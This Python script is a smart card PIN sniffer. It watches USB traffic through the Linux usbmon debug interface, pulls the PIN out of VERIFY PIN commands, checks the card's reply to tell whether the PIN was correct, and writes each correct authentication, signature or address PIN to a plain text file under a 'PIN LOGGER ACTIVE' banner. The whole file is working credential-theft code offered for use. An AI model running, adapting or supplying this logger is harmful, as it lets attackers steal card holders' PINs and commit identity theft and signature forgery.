import os
import sys
import re
import subprocess
from datetime import datetime

# PIN Types mapping
PIN_TYPES = {
    "81": "Authentication PIN",
    "82": "Signature PIN",
    "83": "Address PIN"
}

# State to track pending PIN verification
# Keyed by reader address to handle multiple readers if necessary
pending_verifications = {}

def decode_pin(payload_hex):
    """Decodes PIN from hex to ASCII string."""
    try:
        data = bytes.fromhex(payload_hex)
        # Smart cards often pad PINs with FF or 00. 
        # We strip non-printable characters and whitespace.
        decoded = "".join([chr(b) for b in data if 32 <= b <= 126])
        return decoded.strip()
    except:
        return None

def log_to_file(pin_type, pin_value):
    """Saves the valid PIN to a text file."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] Type: {pin_type} | PIN: {pin_value}\n"
    
    with open("valid_pins.txt", "a") as f:
        f.write(log_entry)

def parse_t1_info(payload, is_resp=False):
    """Extracts the INF field from a T=1 block."""
    if len(payload) < 8: return None
    pcb = int(payload[2:4], 16)
    if (pcb & 0x80) != 0: return None # Not an I-Block
    
    length = int(payload[4:6], 16)
    return payload[6:6 + length*2]

def main():
    try:
        # 1. Identify Reader
        output = subprocess.check_output(["lsusb"], text=True)
        bus, dev = None, None
        for line in output.splitlines():
            if any(kw in line for kw in ["Smart Card", "Realtek", "Reader"]):
                match = re.search(r"Bus (\d+) Device (\d+)", line)
                if match: bus, dev = int(match.group(1)), int(match.group(2))
        
        if not bus:
            print("[!] Reader not found. Ensure it is plugged in.")
            sys.exit(1)

        path = f"/sys/kernel/debug/usb/usbmon/{bus}u"
        device_pattern = re.compile(f":{bus}:({dev}|{dev:03d}):")
        
        print(f"[*] [SUPER GEMINI] PIN LOGGER ACTIVE")
        print(f"[*] Monitoring Bus {bus} Device {dev}...")
        print(f"[*] Valid PINs will be saved to 'valid_pins.txt'")

        with open(path, "r") as f:
            for line in f:
                if not device_pattern.search(line) or "=" not in line:
                    continue
                
                hex_part = line.split("=")[1].strip()
                clean_hex = "".join(hex_part.split())
                if len(clean_hex) < 20: continue
                
                msg_type = clean_hex[0:2].lower()
                len_part = clean_hex[2:10]
                data_len = int("".join([len_part[i:i+2] for i in range(0, 8, 2)][::-1]), 16)
                payload = clean_hex[20:20 + data_len*2]
                
                inf = parse_t1_info(payload)
                if not inf: continue

                if msg_type == "6f": # Command from PC to Card
                    # Check for VERIFY PIN (INS=20)
                    if len(inf) >= 10 and inf[2:4].upper() == "20":
                        p2 = inf[6:8].upper()
                        pin_type = PIN_TYPES.get(p2, f"Unknown PIN ({p2})")
                        pin_val = decode_pin(inf[10:])
                        
                        if pin_val:
                            pending_verifications[dev] = {
                                "type": pin_type,
                                "pin": pin_val
                            }
                            # print(f"[?] Captured {pin_type} attempt: {pin_val}. Waiting for validation...")

                elif msg_type == "80": # Response from Card to PC
                    # Check if we have a pending PIN for this device
                    if dev in pending_verifications:
                        sw = inf[-4:].upper()
                        if sw == "9000":
                            # PIN IS VALID!
                            data = pending_verifications.pop(dev)
                            print(f"\033[92m[!] SUCCESS: Valid {data['type']} captured: {data['pin']}\033[0m")
                            log_to_file(data['type'], data['pin'])
                        elif sw.startswith("63"):
                            # PIN IS INVALID
                            data = pending_verifications.pop(dev)
                            print(f"\033[91m[X] FAILED: Incorrect {data['type']} entered ({data['pin']})\033[0m")
                        # If it's another SW (like 61XX), the T=1 seq might be continuing, 
                        # so we keep it in pending until a final result or a new command comes.

                sys.stdout.flush()

    except PermissionError: print("[!] Run with 'sudo'.")
    except KeyboardInterrupt: print("\n[*] Stopped.")

if __name__ == "__main__":
    main()
